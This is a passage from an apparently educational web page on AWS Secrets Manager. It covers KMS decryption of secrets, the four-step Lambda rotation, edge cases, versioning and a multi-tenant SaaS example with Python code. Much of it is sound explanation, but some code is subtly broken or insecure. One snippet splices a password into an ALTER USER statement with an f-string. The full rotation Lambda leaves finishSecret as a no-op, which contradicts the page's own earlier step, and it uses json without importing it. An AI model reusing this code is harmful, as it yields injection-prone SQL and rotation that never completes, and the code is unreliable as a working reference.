2. Secrets Manager looks up the secret by name/ARN

3. Secrets Manager retrieves the version with "AWSCURRENT" label

4. Secrets Manager has encrypted ciphertext + encrypted data key

5. Secrets Manager calls KMS:
   kms:Decrypt(
     CiphertextBlob=encrypted_data_key,
     EncryptionContext={"SecretARN": "...", "SecretVersionId": "..."}
   )

6. KMS decrypts the data key and returns plaintext data key

7. Secrets Manager uses plaintext data key to decrypt the secret

8. Secrets Manager returns plaintext secret to application

9. Application uses the secret (e.g., connects to database)

10. Application MUST NOT log or write secret to disk</code></pre>

            <div class="callout callout-info">
                <strong>Performance Note:</strong> Each <code>GetSecretValue</code> call incurs both a Secrets Manager
                API call
                and a KMS decrypt call. For high-throughput applications, cache secrets in memory with reasonable TTL
                (e.g., 5-10 minutes).
            </div>

            <h4>Automatic Rotation - The Four-Step Process</h4>

            <p>Secrets Manager uses a Lambda function to rotate secrets. The function implements four steps:</p>

            <div id="rotation-flow-widget"></div>

            <div class="grid grid-2" style="margin-top: 1rem;">
                <div class="callout callout-info">
                    <h5>Step 1: createSecret</h5>
                    <ul style="font-size: 0.9rem; margin-left: 1.5rem;">
                        <li>Generate new secret value (strong random password)</li>
                        <li>Store in Secrets Manager with <code>AWSPENDING</code> label</li>
                        <li>Do NOT change anything in the target service yet</li>
                    </ul>
                    <pre style="margin-top: 0.5rem;"><code>new_password = generate_strong_password()
put_secret_value(
  VersionStage="AWSPENDING",
  SecretString=new_password
)</code></pre>
                </div>

                <div class="callout callout-warning">
                    <h5>Step 2: setSecret</h5>
                    <ul style="font-size: 0.9rem; margin-left: 1.5rem;">
                        <li>Update the target service with new secret</li>
                        <li>For RDS: <code>ALTER USER ... SET PASSWORD</code></li>
                        <li>For API keys: Call service API to rotate key</li>
                        <li>Critical: Use <code>AWSCURRENT</code> to connect, set <code>AWSPENDING</code> value</li>
                    </ul>
                    <pre style="margin-top: 0.5rem;"><code>current_secret = get_secret("AWSCURRENT")
pending_secret = get_secret("AWSPENDING")
db.connect(current_secret)
db.execute(f"ALTER USER master PASSWORD '{pending_secret}'")</code></pre>
                </div>
            </div>

            <div class="grid grid-2">
                <div class="callout callout-success">
                    <h5>Step 3: testSecret</h5>
                    <ul style="font-size: 0.9rem; margin-left: 1.5rem;">
                        <li>Verify new secret works</li>
                        <li>Connect to service using <code>AWSPENDING</code> value</li>
                        <li>Run basic connectivity/auth test</li>
                        <li>If fails: Raise exception, rotation aborts</li>
                    </ul>
                    <pre style="margin-top: 0.5rem;"><code>pending_secret = get_secret("AWSPENDING")
try:
  db.connect(pending_secret)
  db.execute("SELECT 1")  # Test query
except Exception as e:
  raise RotationError("Test failed!")</code></pre>
                </div>

                <div class="callout callout-success">
                    <h5>Step 4: finishSecret</h5>
                    <ul style="font-size: 0.9rem; margin-left: 1.5rem;">
                        <li>Move <code>AWSCURRENT</code> label to <code>AWSPENDING</code> version</li>
                        <li>Old <code>AWSCURRENT</code> becomes <code>AWSPREVIOUS</code></li>
                        <li>Applications now get new secret on next retrieval</li>
                        <li>Old secret remains available as <code>AWSPREVIOUS</code></li>
                    </ul>
                    <pre style="margin-top: 0.5rem;"><code>update_version_stage(
  VersionStage="AWSCURRENT",
  MoveToVersionId=pending_version_id
)
# AWSCURRENT ‚Üí AWSPREVIOUS (automatic)
# AWSPENDING ‚Üí AWSCURRENT (explicit)</code></pre>
                </div>
            </div>

            <h4>Tricky Edge Cases in Rotation</h4>

            <div class="alert alert-danger">
                <h5>Edge Case 1: Application Doesn't Refresh Secret</h5>
                <p>
                    <strong>Problem:</strong> Application retrieves secret once at startup, caches indefinitely
                    <br><strong>Impact:</strong> After rotation, application uses <code>AWSPREVIOUS</code> password
                    <br><strong>Solution:</strong>
                </p>
                <ul style="margin-left: 1.5rem;">
                    <li>Implement cache expiry (e.g., refresh every 5-10 minutes)</li>
                    <li>Or: Use event-driven refresh (Secrets Manager publishes to EventBridge on rotation)</li>
                    <li>Or: On database connection failure, immediately refresh secret before retry</li>
                </ul>
            </div>

            <div class="alert alert-danger">
                <h5>Edge Case 2: Multi-User Rotation</h5>
                <p>
                    <strong>Problem:</strong> Rotating a master user password affects all connections
                    <br><strong>Limitation:</strong> Single-user rotation has downtime risk during
                    <code>setSecret</code> step
                    <br><strong>Solution:</strong> Use multi-user rotation:
                </p>
                <ul style="margin-left: 1.5rem;">
                    <li>Create two database users: <code>master_a</code> and <code>master_b</code></li>
                    <li>Applications use <code>master_a</code> initially</li>
                    <li>Rotation updates <code>master_b</code> password, tests, then switches applications to
                        <code>master_b</code>
                    </li>
                    <li>Next rotation updates <code>master_a</code> and switches back</li>
                    <li>Zero downtime: One user always has valid password</li>
                </ul>
            </div>

            <div class="alert alert-danger">
                <h5>Edge Case 3: Rotation Lambda Network Access</h5>
                <p>
                    <strong>Problem:</strong> Rotation Lambda needs access to both Secrets Manager API AND target
                    database
                    <br><strong>Challenge:</strong> Database in private VPC, Secrets Manager is AWS public API
                    <br><strong>Solution:</strong>
                </p>
                <ul style="margin-left: 1.5rem;">
                    <li>Lambda in VPC private subnet (can reach database)</li>
                    <li>VPC endpoint for Secrets Manager (no internet required)</li>
                    <li>Security group: Allow Lambda ‚Üí RDS on port 5432</li>
                    <li>No NAT Gateway needed (cost savings + security)</li>
                </ul>
            </div>

            <h4>Secret Versioning Deep Dive</h4>

            <p>Every secret update creates a new version. Versions are immutable.</p>

            <pre><code>Secret: prod/db/postgres/master

Version History:
v1: "password123"       [AWSPREVIOUS]  (created 60 days ago)
v2: "P@ssw0rd456"       [AWSCURRENT]   (created 30 days ago, current)
v3: "Str0ng!Pass789"    [AWSPENDING]   (created 5 min ago, rotating)

After rotation completes:
v1: "password123"       [no label]     (eligible for deletion)
v2: "P@ssw0rd456"       [AWSPREVIOUS]  (kept for rollback)
v3: "Str0ng!Pass789"    [AWSCURRENT]   (now active)</code></pre>

            <div class="callout callout-success">
                <strong>Rollback Strategy:</strong> If rotation causes issues, you can:
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li>Move <code>AWSCURRENT</code> label back to <code>AWSPREVIOUS</code> version</li>
                    <li>Applications immediately start using old password</li>
                    <li>Update database to re-enable old password (if needed)</li>
                </ol>
            </div>

            <h4>Subtle Behaviors That Confuse Engineers</h4>

            <div class="alert alert-warning">
                <strong>Confusion 1: "My secret isn't rotating!"</strong>
                <p>
                    Common mistake: Rotation schedule is set, but the secret has no rotation Lambda configured.
                    <br><strong>Fix:</strong> Attach a rotation Lambda ARN to the secret.
                </p>
            </div>

            <div class="alert alert-warning">
                <strong>Confusion 2: "Rotation succeeded, but my app broke!"</strong>
                <p>
                    Root cause: Application caches old secret, never refreshes.
                    <br><strong>Fix:</strong> Implement periodic cache refresh or event-driven updates.
                </p>
            </div>

            <div class="alert alert-warning">
                <strong>Confusion 3: "Can I rotate secrets stored in Parameter Store?"</strong>
                <p>
                    Answer: No. AWS Systems Manager Parameter Store does NOT support automatic rotation.
                    You must manually update parameters and restart applications. Use Secrets Manager for credentials
                    that need rotation.
                </p>
            </div>

            <div class="alert alert-warning">
                <strong>Confusion 4: "Why did my KMS decrypt call fail after rotation?"</strong>
                <p>
                    Cause: You're using encryption context that includes <code>SecretVersionId</code>, which changes
                    after rotation.
                    <br><strong>Fix:</strong> Don't include version-specific data in encryption context unless you
                    re-encrypt after rotation.
                </p>
            </div>
        </section>

        <!-- Section 5: Real-World Context -->
        <section class="card">
            <div class="card-header">5. Real-World Context & Interactions</div>

            <h3>Concrete Scenario: Multi-Tenant SaaS Platform</h3>

            <div class="callout callout-info">
                <strong>System Architecture:</strong>
                <ul style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li><strong>Frontend:</strong> React SPA hosted on CloudFront + S3</li>
                    <li><strong>API Gateway:</strong> REST API with JWT authentication</li>
                    <li><strong>Backend:</strong> ECS Fargate tasks (Python FastAPI)</li>
                    <li><strong>Database:</strong> PostgreSQL RDS per tenant (DB-per-tenant isolation model)</li>
                    <li><strong>Background Jobs:</strong> Lambda functions triggered by SQS</li>
                    <li><strong>Tenants:</strong> 500 customers, each with isolated database</li>
                </ul>
            </div>

            <h4>Architecture Diagram (ASCII)</h4>

            <pre><code>‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ   CloudFront ‚îÇ (Frontend SPA)
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
       ‚îÇ HTTPS
       ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                      API Gateway (JWT auth)                   ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                           ‚îÇ
       ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
       ‚îÇ                   ‚îÇ                   ‚îÇ
       ‚ñº                   ‚ñº                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ ECS Fargate ‚îÇ    ‚îÇ ECS Fargate ‚îÇ    ‚îÇ ECS Fargate ‚îÇ  (Backend)
‚îÇ   Task 1    ‚îÇ    ‚îÇ   Task 2    ‚îÇ    ‚îÇ   Task 3    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
       ‚îÇ                   ‚îÇ                   ‚îÇ
       ‚îÇ Retrieve secrets  ‚îÇ                   ‚îÇ
       ‚ñº                   ‚ñº                   ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ              AWS Secrets Manager                          ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê    ‚îÇ
‚îÇ  ‚îÇ prod/db/tenant-acme/master   [AWSCURRENT]        ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ prod/db/tenant-globex/master [AWSCURRENT]        ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ prod/db/tenant-initech/master [AWSCURRENT]       ‚îÇ    ‚îÇ
‚îÇ  ‚îÇ         ... (500 secrets total)                  ‚îÇ    ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò    ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
                        ‚îÇ Encrypted with KMS
                        ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ                  AWS KMS (Customer Managed Key)            ‚îÇ
‚îÇ  Key Policy: Enforce encryption context (tenant_id)       ‚îÇ
‚îÇ  Automatic rotation: Enabled (yearly)                     ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
       ‚îÇ
       ‚îÇ Decrypt + Encrypt operations
       ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ            CloudTrail Logs (Security Monitoring)          ‚îÇ
‚îÇ  - All kms:Decrypt calls logged                           ‚îÇ
‚îÇ  - All secretsmanager:GetSecretValue logged               ‚îÇ
‚îÇ  - Alerts on anomalies (new principal, high volume, etc.) ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

Backend tasks connect to RDS:
       ‚îÇ
       ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  RDS PostgreSQL Instances (one per tenant)              ‚îÇ
‚îÇ  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê  ‚îÇ
‚îÇ  ‚îÇ tenant-acme  ‚îÇ  ‚îÇ tenant-globex‚îÇ  ‚îÇ tenant-initech‚îÇ ‚îÇ
‚îÇ  ‚îÇ   (RDS)      ‚îÇ  ‚îÇ   (RDS)      ‚îÇ  ‚îÇ   (RDS)       ‚îÇ ‚îÇ
‚îÇ  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò  ‚îÇ
‚îÇ  Each encrypted at rest with KMS, passwords in Secrets  ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò

Automatic Rotation (every 30 days):
       ‚îÇ
       ‚ñº
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  Lambda Rotation Function (per secret)                  ‚îÇ
‚îÇ  - createSecret: Generate new password                   ‚îÇ
‚îÇ  - setSecret: Update RDS master password                ‚îÇ
‚îÇ  - testSecret: Verify connectivity                       ‚îÇ
‚îÇ  - finishSecret: Promote AWSPENDING ‚Üí AWSCURRENT        ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò</code></pre>

            <h3>The Happy Path (Secure Flow)</h3>

            <h4>Step 1: Application Startup</h4>

            <pre><code># ECS Task startup (Python FastAPI app)
import boto3
import json

secrets_client = boto3.client('secretsmanager', region_name='us-east-1')

def get_db_credentials(tenant_id):
    """
    Retrieve database credentials for a specific tenant.
    """
    secret_name = f"prod/db/tenant-{tenant_id}/master"
    
    response = secrets_client.get_secret_value(
        SecretId=secret_name
    )
    
    secret = json.loads(response['SecretString'])
    return {
        'host': secret['host'],
        'port': secret['port'],
        'username': secret['username'],
        'password': secret['password'],
        'database': secret['database']
    }

# On startup, retrieve credentials and create connection pool
tenant_id = "acme"  # Derived from JWT tenant claim
db_creds = get_db_credentials(tenant_id)

# Create connection pool (psycopg2 or SQLAlchemy)
connection_pool = create_connection_pool(db_creds)</code></pre>

            <div class="callout callout-success">
                <strong>What happened behind the scenes:</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li>ECS task has IAM role: <code>arn:aws:iam::123456789012:role/ecs-task-prod-backend</code></li>
                    <li>Task calls <code>secretsmanager:GetSecretValue</code> with secret name</li>
                    <li>Secrets Manager checks IAM policy: Does task role have permission? ‚úÖ</li>
                    <li>Secrets Manager retrieves encrypted secret from storage</li>
                    <li>Secrets Manager calls <code>kms:Decrypt</code> with encryption context:
                        <pre><code>{
  "aws:secretsmanager:secret-arn": "arn:aws:secretsmanager:...:secret:prod/db/tenant-acme/master",
  "aws:secretsmanager:version-id": "v1234"
}</code></pre>
                    </li>
                    <li>KMS checks key policy: Does task role have <code>kms:Decrypt</code>? ‚úÖ</li>
                    <li>KMS validates encryption context matches ciphertext ‚úÖ</li>
                    <li>KMS decrypts data key, returns to Secrets Manager</li>
                    <li>Secrets Manager decrypts secret, returns plaintext to application</li>
                    <li>Application connects to PostgreSQL using credentials</li>
                </ol>
            </div>

            <h4>Step 2: Request Processing (Tenant Isolation)</h4>

            <pre><code># Incoming API request
@app.get("/api/users/{user_id}")
async def get_user(user_id: str, token: str = Depends(verify_jwt)):
    """
    Retrieve user data. Token contains tenant_id claim.
    """
    tenant_id = token['tenant_id']  # e.g., "acme"
    
    # Get tenant-specific database connection
    # This uses cached credentials retrieved at startup
    db = get_tenant_db_connection(tenant_id)
    
    user = db.query("SELECT * FROM users WHERE id = %s", (user_id,))
    return user</code></pre>

            <div class="callout callout-info">
                <strong>Tenant Isolation Enforcement:</strong>
                <ul style="margin-left: 1.5rem;">
                    <li>JWT contains <code>tenant_id</code> claim, verified by API Gateway</li>
                    <li>Application retrieves correct tenant's database credentials from Secrets Manager</li>
                    <li>Each tenant has separate database instance</li>
                    <li>Even if attacker compromises one tenant's credentials, they cannot access other tenants' data
                    </li>
                </ul>
            </div>

            <h4>Step 3: Automatic Rotation (Every 30 Days)</h4>

            <pre><code># Lambda rotation function (triggered by Secrets Manager)
import boto3
import psycopg2
import secrets
import string

def lambda_handler(event, context):
    """
    Rotate RDS PostgreSQL password for a tenant.
    Follows the 4-step rotation pattern.
    """
    secrets_client = boto3.client('secretsmanager')
    
    # Extract parameters from event
    secret_arn = event['SecretId']
    token = event['ClientRequestToken']
    step = event['Step']
    
    if step == "createSecret":
        # Step 1: Generate new password, store as AWSPENDING
        current_secret = secrets_client.get_secret_value(
            SecretId=secret_arn,
            VersionStage="AWSCURRENT"
        )
        current_dict = json.loads(current_secret['SecretString'])
        
        # Generate strong password (32 chars, mixed case + numbers + symbols)
        new_password = ''.join(
            secrets.choice(string.ascii_letters + string.digits + "!@#$%^&*")
            for _ in range(32)
        )
        
        # Update secret with new password
        current_dict['password'] = new_password
        secrets_client.put_secret_value(
            SecretId=secret_arn,
            ClientRequestToken=token,
            SecretString=json.dumps(current_dict),
            VersionStages=['AWSPENDING']
        )
        
    elif step == "setSecret":
        # Step 2: Update RDS master password
        current_secret = secrets_client.get_secret_value(
            SecretId=secret_arn,
            VersionStage="AWSCURRENT"
        )
        pending_secret = secrets_client.get_secret_value(
            SecretId=secret_arn,
            VersionStage="AWSPENDING"
        )
        
        current_dict = json.loads(current_secret['SecretString'])
        pending_dict = json.loads(pending_secret['SecretString'])
        
        # Connect with current password
        conn = psycopg2.connect(
            host=current_dict['host'],
            port=current_dict['port'],
            user=current_dict['username'],
            password=current_dict['password'],
            database=current_dict['database']
        )
        cursor = conn.cursor()
        
        # Set new password
        cursor.execute(
            f"ALTER USER {current_dict['username']} WITH PASSWORD %s",
            (pending_dict['password'],)
        )
        conn.commit()
        conn.close()
        
    elif step == "testSecret":
        # Step 3: Test new password
        pending_secret = secrets_client.get_secret_value(
            SecretId=secret_arn,
            VersionStage="AWSPENDING"
        )
        pending_dict = json.loads(pending_secret['SecretString'])
        
        # Attempt connection with new password
        conn = psycopg2.connect(
            host=pending_dict['host'],
            port=pending_dict['port'],
            user=pending_dict['username'],
            password=pending_dict['password'],
            database=pending_dict['database']
        )
        cursor = conn.cursor()
        cursor.execute("SELECT 1")  # Simple test query
        result = cursor.fetchone()
        if result[0] != 1:
            raise Exception("Test query failed!")
        conn.close()
        
    elif step == "finishSecret":
        # Step 4: Promote AWSPENDING to AWSCURRENT
        # This happens automatically by Secrets Manager
        # Old AWSCURRENT becomes AWSPREVIOUS
        pass
    
    return {
        'statusCode': 200,
        'body': json.dumps(f'Rotation step {step} completed successfully')
    }</code></pre>

            <div class="callout callout-success">
                <strong>Rotation Process Summary:</strong>
                <ol style="margin-left: 1.5rem; margin-top: 0.5rem;">
                    <li><strong>Day 0:</strong> Secret created with <code>AWSCURRENT</code> label</li>
                    <li><strong>Day 30:</strong> Secrets Manager triggers rotation Lambda</li>
                    <li><strong>createSecret:</strong> New password generated, stored as <code>AWSPENDING</code> (takes
                        1 second)</li>
                    <li><strong>setSecret:</strong> RDS master password updated via SQL (takes 2-5 seconds)</li>
                    <li><strong>testSecret:</strong> Verify new password works (takes 1 second)</li>
